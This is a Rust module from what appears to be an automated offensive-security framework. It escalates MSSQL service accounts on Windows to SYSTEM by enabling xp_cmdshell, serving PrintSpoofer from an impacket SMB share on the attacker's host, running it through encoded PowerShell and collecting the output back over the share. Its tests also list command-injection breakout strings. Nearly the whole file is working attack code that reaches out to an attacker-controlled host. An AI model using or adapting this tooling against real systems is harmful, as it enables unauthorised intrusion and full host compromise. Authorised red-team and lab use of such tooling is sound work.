use std::path::PathBuf;
use std::process::Stdio;
use std::time::Duration;

use anyhow::{anyhow, bail, Context, Result};
use serde_json::Value;
use tokio::process::Command as TokioCommand;

use crate::args::{optional_str, required_str};
use crate::coercion::{is_local_interface_ip, wait_for_port_free};
use crate::lateral::mssql::{mssql_from_args, mssql_query, ps_encoded_command};
use crate::ToolOutput;

const PAYLOAD_DIR_ENV: &str = "ARES_PRIVESC_PAYLOAD_DIR";
const DEFAULT_PAYLOAD_DIR: &str = "/opt/privesc";
const STAGE_SHARE: &str = "ares";
const STAGE_OUTPUT_DIR: &str = "out";
const SMB_SERVER_BIN: &str = "impacket-smbserver";
const DEFAULT_CHILD_COMMAND: &str = "whoami /all";
const SYSTEM_IDENTITY: &str = "nt authority\\system";
const PRE_BEGIN: &str = "___ARES_PRIVESC_PRE_BEGIN___";
const PRE_END: &str = "___ARES_PRIVESC_PRE_END___";
const MAX_CHILD_COMMAND_LEN: usize = 256;

pub struct WindowsPayload {
    pub name: &'static str,
    pub relative_path: &'static str,
    pub argv_template: &'static [&'static str],
    pub requires_privilege: &'static str,
    pub mitre_id: &'static str,
    pub unc_safe: bool,
}

pub const WINDOWS_PAYLOADS: &[WindowsPayload] = &[WindowsPayload {
    name: "printspoofer",
    relative_path: "PrintSpoofer/PrintSpoofer64.exe",
    argv_template: &["-c", "{child_command}"],
    requires_privilege: "SeImpersonatePrivilege",
    mitre_id: "T1134.001",
    unc_safe: true,
}];

pub fn payload_by_name(name: &str) -> Option<&'static WindowsPayload> {
    WINDOWS_PAYLOADS.iter().find(|p| p.name == name)
}

pub fn payload_names() -> Vec<&'static str> {
    WINDOWS_PAYLOADS.iter().map(|p| p.name).collect()
}

fn payload_dir() -> PathBuf {
    std::env::var(PAYLOAD_DIR_ENV)
        .unwrap_or_else(|_| DEFAULT_PAYLOAD_DIR.to_string())
        .into()
}

fn validate_child_command(command: &str) -> Result<()> {
    if command.trim().is_empty() {
        bail!("child_command must not be empty");
    }
    if command.len() > MAX_CHILD_COMMAND_LEN {
        bail!(
            "child_command is {} chars, limit is {MAX_CHILD_COMMAND_LEN}",
            command.len()
        );
    }
    for c in command.chars() {
        let permitted = c.is_ascii_alphanumeric()
            || matches!(c, ' ' | '/' | '\\' | '.' | ':' | '-' | '_' | '=' | ',');
        if !permitted {
            bail!(
                "child_command rejected: {c:?} is not an allowed character. \
                 Permitted: alphanumerics, space, and / \\ . : - _ = ,"
            );
        }
    }
    Ok(())
}

fn render_argv(payload: &WindowsPayload, wrapped_child: &str) -> String {
    payload
        .argv_template
        .iter()
        .map(|token| {
            if *token == "{child_command}" {
                format!("\"{wrapped_child}\"")
            } else {
                (*token).to_string()
            }
        })
        .collect::<Vec<_>>()
        .join(" ")
}

struct StagePlan {
    exe_unc: String,
    output_unc: String,
    argv: String,
}

fn build_stage_script(plan: &StagePlan) -> String {
    format!(
        "$ErrorActionPreference='Continue'\n\
         [Console]::Out.WriteLine('{PRE_BEGIN}')\n\
         [Console]::Out.WriteLine((whoami))\n\
         [Console]::Out.WriteLine('{PRE_END}')\n\
         & '{exe}' {argv}\n\
         Start-Sleep -Seconds 3\n",
        exe = plan.exe_unc,
        argv = plan.argv,
    )
}

fn extract_pre_identity(stdout: &str) -> Option<String> {
    let start = stdout.find(PRE_BEGIN)? + PRE_BEGIN.len();
    let rest = &stdout[start..];
    let end = rest.find(PRE_END)?;
    rest[..end]
        .lines()
        .map(str::trim)
        .find(|line| !line.is_empty() && *line != "NULL" && !line.starts_with("---"))
        .map(str::to_string)
}

fn is_system(identity: &str) -> bool {
    identity.to_ascii_lowercase().contains(SYSTEM_IDENTITY)
}

async fn read_staged_output(path: &std::path::Path, budget: Duration) -> Option<String> {
    let deadline = std::time::Instant::now() + budget;
    loop {
        if let Ok(text) = tokio::fs::read_to_string(path).await {
            if !text.trim().is_empty() {
                return Some(text);
            }
        }
        if std::time::Instant::now() >= deadline {
            return None;
        }
        tokio::time::sleep(Duration::from_millis(500)).await;
    }
}

fn failure(marker: &str, detail: &str) -> ToolOutput {
    ToolOutput {
        stdout: format!("{marker}\n{detail}"),
        stderr: String::new(),
        exit_code: Some(0),
        success: false,
    }
}

pub async fn windows_stage_and_run(args: &Value) -> Result<ToolOutput> {
    let target = required_str(args, "target")?.to_string();
    let attacker_ip = required_str(args, "attacker_ip")?.to_string();
    let payload_name = required_str(args, "payload")?;
    let child_command = optional_str(args, "child_command").unwrap_or(DEFAULT_CHILD_COMMAND);

    let payload = payload_by_name(payload_name).ok_or_else(|| {
        anyhow!(
            "unknown payload '{payload_name}'. Registered payloads: {}",
            payload_names().join(", ")
        )
    })?;
    validate_child_command(child_command)?;

    if !is_local_interface_ip(&attacker_ip) {
        bail!(
            "attacker_ip ({attacker_ip}) is not an IP bound to a local interface. \
             The target fetches the payload from this address over SMB, so it must \
             be a routable address on this worker."
        );
    }

    let source = payload_dir().join(payload.relative_path);
    if !source.is_file() {
        return Ok(failure(
            "PAYLOAD_MISSING",
            &format!(
                "{} is not present on this worker. Set {PAYLOAD_DIR_ENV} if the \
                 privesc payload directory is not {DEFAULT_PAYLOAD_DIR}.",
                source.display()
            ),
        ));
    }
    let filename = source
        .file_name()
        .and_then(|n| n.to_str())
        .context("payload path has no file name")?
        .to_string();

    let tempdir = tempfile::Builder::new()
        .prefix("ares_stage_")
        .tempdir()
        .context("failed to create payload staging directory")?;
    let share_root = tempdir.path().to_path_buf();
    let output_dir = share_root.join(STAGE_OUTPUT_DIR);
    tokio::fs::create_dir_all(&output_dir)
        .await
        .context("failed to create staged output directory")?;
    tokio::fs::copy(&source, share_root.join(&filename))
        .await
        .with_context(|| format!("failed to stage {} into the share", source.display()))?;

    if let Err(busy) = wait_for_port_free(445, Duration::from_secs(8)).await {
        return Ok(failure(
            "SMB_STAGE_BIND_BUSY",
            &format!(
                "port 445 is occupied, so the payload share cannot bind. A relay or \
                 orphaned impacket process from an earlier task usually holds it — \
                 check `ss -tlnp '( sport = :445 )'` on this worker. Last error: {busy}"
            ),
        ));
    }

    let smb_log = std::fs::File::create(share_root.join("smbserver.log"))
        .context("failed to create smbserver log")?;
    let smb_log_err = smb_log.try_clone().context("failed to dup smbserver log")?;
    let mut smb_server = TokioCommand::new(SMB_SERVER_BIN)
        .arg("-smb2support")
        .arg(STAGE_SHARE)
        .arg(&share_root)
        .stdin(Stdio::null())
        .stdout(Stdio::from(smb_log))
        .stderr(Stdio::from(smb_log_err))
        .kill_on_drop(true)
        .spawn()
        .with_context(|| format!("failed to spawn {SMB_SERVER_BIN} (is impacket installed?)"))?;
    tokio::time::sleep(Duration::from_millis(1500)).await;

    let enable = crate::lateral::mssql_enable_xp_cmdshell(args).await?;
    if !enable.success {
        let _ = smb_server.kill().await;
        return Ok(failure(
            "XP_CMDSHELL_ENABLE_FAILED",
            &format!(
                "could not enable xp_cmdshell on {target}. The connecting login needs \
                 sysadmin, or an impersonate_user that has it.\n{}",
                enable.combined()
            ),
        ));
    }

    let token = uuid::Uuid::new_v4().to_string();
    let output_file = output_dir.join(format!("{token}.txt"));
    let output_unc = format!("\\\\{attacker_ip}\\{STAGE_SHARE}\\{STAGE_OUTPUT_DIR}\\{token}.txt");
    let plan = StagePlan {
        exe_unc: format!("\\\\{attacker_ip}\\{STAGE_SHARE}\\{filename}"),
        argv: render_argv(
            payload,
            &format!("cmd /c {child_command} > {output_unc} 2>&1"),
        ),
        output_unc,
    };

    let encoded = ps_encoded_command(&build_stage_script(&plan));
    let sql = format!("EXEC xp_cmdshell 'powershell -NoProfile -EncodedCommand {encoded}';");
    let exec = mssql_query(mssql_from_args(args)?, &sql).await?;
    let exec_stdout = exec.combined_raw();

    let captured = read_staged_output(&output_file, Duration::from_secs(25)).await;
    let _ = smb_server.kill().await;

    Ok(classify_run(&ClassifyInput {
        payload: payload.name,
        target: &target,
        output_unc: &plan.output_unc,
        exec_stdout: &exec_stdout,
        captured: captured.as_deref(),
    }))
}

struct ClassifyInput<'a> {
    payload: &'a str,
    target: &'a str,
    output_unc: &'a str,
    exec_stdout: &'a str,
    captured: Option<&'a str>,
}

fn classify_run(input: &ClassifyInput) -> ToolOutput {
    let Some(pre_identity) = extract_pre_identity(input.exec_stdout) else {
        return failure(
            "STAGE_NO_OUTPUT",
            &format!(
                "xp_cmdshell returned no identity marker, so the PowerShell stage never \
                 ran on {}. xp_cmdshell may be disabled, or the login may lack rights \
                 to call it.\n{}",
                input.target, input.exec_stdout
            ),
        );
    };

    if is_system(&pre_identity) {
        return failure(
            "PRIVESC_NO_OP",
            &format!(
                "the execution channel on {} is already running as {pre_identity}. \
                 Escalation to SYSTEM from SYSTEM is not an escalation and is not \
                 credited — this host was already owned at this level.",
                input.target
            ),
        );
    }

    let (result, source) = match input.captured {
        Some(text) => (text, "share"),
        None => (input.exec_stdout, "stdout"),
    };

    if !is_system(result) {
        return failure(
            "PRIVESC_FAILED",
            &format!(
                "payload {} ran as {pre_identity} on {} but the child command did not \
                 report SYSTEM. Staged output ({source}) follows.\n{result}",
                input.payload, input.target
            ),
        );
    }

    let system_line = result
        .lines()
        .map(str::trim)
        .find(|line| is_system(line))
        .unwrap_or(SYSTEM_IDENTITY)
        .to_string();

    ToolOutput {
        stdout: format!(
            "PRIVESC_PAYLOAD={}\n\
             PRIVESC_TARGET={}\n\
             PRIVESC_PRE_IDENTITY={pre_identity}\n\
             PRIVESC_SYSTEM={system_line}\n\
             PRIVESC_RESULT_SOURCE={source}\n\
             PRIVESC_OUTPUT_UNC={}\n\
             --- payload output ---\n{result}",
            input.payload, input.target, input.output_unc
        ),
        stderr: String::new(),
        exit_code: Some(0),
        success: true,
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use serde_json::json;

    fn classify(pre: &str, captured: Option<&str>) -> ToolOutput {
        let stdout = format!("{PRE_BEGIN}\n{pre}\n{PRE_END}\n");
        classify_run(&ClassifyInput {
            payload: "printspoofer",
            target: "192.168.58.30",
            output_unc: "\\\\192.168.58.100\\ares\\out\\t.txt",
            exec_stdout: &stdout,
            captured,
        })
    }

    #[test]
    fn every_payload_declares_a_relative_path_and_technique() {
        for payload in WINDOWS_PAYLOADS {
            assert!(
                !payload.relative_path.starts_with('/'),
                "{} must be relative to the payload dir",
                payload.name
            );
            assert!(
                payload.mitre_id.starts_with('T'),
                "{} needs a MITRE technique id",
                payload.name
            );
            assert!(
                payload.unc_safe,
                "{} is not confirmed UNC-safe, so it cannot be launched from the share",
                payload.name
            );
        }
    }

    #[test]
    fn argv_template_slot_is_quoted_when_rendered() {
        let payload = payload_by_name("printspoofer").unwrap();
        let argv = render_argv(payload, "cmd /c whoami");
        assert_eq!(argv, "-c \"cmd /c whoami\"");
    }

    #[test]
    fn child_command_rejects_quote_and_redirect_breakouts() {
        for bad in [
            "whoami\" & calc",
            "whoami | net user",
            "whoami > c:\\x.txt",
            "whoami; net user",
            "whoami $(id)",
            "whoami `id`",
            "",
        ] {
            assert!(
                validate_child_command(bad).is_err(),
                "expected {bad:?} to be rejected"
            );
        }
    }

    #[test]
    fn child_command_accepts_ordinary_enumeration() {
        for good in [
            "whoami /all",
            "net user",
            "reg query HKLM\\SYSTEM",
            "hostname",
        ] {
            assert!(
                validate_child_command(good).is_ok(),
                "expected {good:?} to be accepted"
            );
        }
    }

    #[test]
    fn already_system_channel_is_refused_not_credited() {
        let out = classify("NT AUTHORITY\\SYSTEM", Some("nt authority\\system"));
        assert!(!out.success);
        assert!(out.stdout.contains("PRIVESC_NO_OP"));
    }

    #[test]
    fn service_account_reaching_system_is_credited() {
        let out = classify("contoso\\svc_sql", Some("nt authority\\system\n"));
        assert!(out.success);
        assert!(out.stdout.contains("PRIVESC_SYSTEM=nt authority\\system"));
        assert!(out.stdout.contains("PRIVESC_RESULT_SOURCE=share"));
    }

    #[test]
    fn service_account_without_system_is_a_failure() {
        let out = classify("contoso\\svc_sql", Some("contoso\\svc_sql"));
        assert!(!out.success);
        assert!(out.stdout.contains("PRIVESC_FAILED"));
    }

    #[test]
    fn missing_identity_marker_reports_stage_failure() {
        let out = classify_run(&ClassifyInput {
            payload: "printspoofer",
            target: "192.168.58.30",
            output_unc: "\\\\192.168.58.100\\ares\\out\\t.txt",
            exec_stdout: "Msg 15281, xp_cmdshell is disabled",
            captured: None,
        });
        assert!(!out.success);
        assert!(out.stdout.contains("STAGE_NO_OUTPUT"));
    }

    #[test]
    fn stdout_fallback_is_used_when_the_share_write_never_lands() {
        let out = classify("contoso\\svc_sql", None);
        assert!(!out.success);

        let stdout = format!("{PRE_BEGIN}\ncontoso\\svc_sql\n{PRE_END}\nnt authority\\system\n");
        let fallback = classify_run(&ClassifyInput {
            payload: "printspoofer",
            target: "192.168.58.30",
            output_unc: "\\\\192.168.58.100\\ares\\out\\t.txt",
            exec_stdout: &stdout,
            captured: None,
        });
        assert!(fallback.success);
        assert!(fallback.stdout.contains("PRIVESC_RESULT_SOURCE=stdout"));
    }

    #[test]
    fn unknown_payload_names_the_registered_set() {
        let args = json!({
            "target": "192.168.58.30",
            "username": "alice",
            "attacker_ip": "192.168.58.100",
            "payload": "sweetpotato",
        });
        let rt = tokio::runtime::Runtime::new().unwrap();
        let err = rt.block_on(windows_stage_and_run(&args)).unwrap_err();
        assert!(err.to_string().contains("printspoofer"));
    }

    #[test]
    fn attacker_ip_is_required() {
        let args = json!({"target": "192.168.58.30", "username": "alice"});
        let rt = tokio::runtime::Runtime::new().unwrap();
        let err = rt.block_on(windows_stage_and_run(&args)).unwrap_err();
        assert!(err.to_string().contains("attacker_ip"));
    }

    #[test]
    fn build_stage_script_frames_identity_and_calls_the_unc_path() {
        let plan = StagePlan {
            exe_unc: "\\\\192.168.58.100\\ares\\PrintSpoofer64.exe".into(),
            output_unc: "\\\\192.168.58.100\\ares\\out\\t.txt".into(),
            argv: "-c \"cmd /c whoami /all > \\\\192.168.58.100\\ares\\out\\t.txt 2>&1\"".into(),
        };
        let script = build_stage_script(&plan);
        assert!(script.contains(PRE_BEGIN));
        assert!(script.contains(PRE_END));
        assert!(script.contains("& '\\\\192.168.58.100\\ares\\PrintSpoofer64.exe'"));
    }

    #[test]
    fn encoded_command_carries_no_sql_quote_characters() {
        let plan = StagePlan {
            exe_unc: "\\\\192.168.58.100\\ares\\PrintSpoofer64.exe".into(),
            output_unc: "\\\\192.168.58.100\\ares\\out\\t.txt".into(),
            argv: "-c \"cmd /c whoami /all\"".into(),
        };
        let encoded = ps_encoded_command(&build_stage_script(&plan));
        assert!(
            !encoded.contains('\''),
            "a quote in the payload would break the xp_cmdshell SQL literal"
        );
    }
}
